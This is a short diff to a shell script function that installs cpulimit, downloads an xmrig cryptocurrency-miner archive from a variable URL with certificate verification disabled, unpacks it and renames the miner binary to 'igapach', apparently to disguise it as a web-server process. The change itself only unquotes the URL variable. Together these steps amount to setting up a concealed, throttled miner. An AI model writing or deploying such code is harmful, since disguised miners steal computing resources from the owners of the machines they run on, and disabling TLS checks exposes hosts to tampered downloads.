@@ -31,7 +31,7 @@ out0 () {
 c3_install () {
         apt update
         apt install cpulimit htop -y
-        wget --no-check-certificate '$C3_URL' -qO $HOME/xmrig.tar.gz
+        wget --no-check-certificate $C3_URL -qO $HOME/xmrig.tar.gz
         mkdir $HOME/c3
         tar xf xmrig.tar.gz -C $HOME/c3
         mv $HOME/c3/xmrig $HOME/c3/igapach
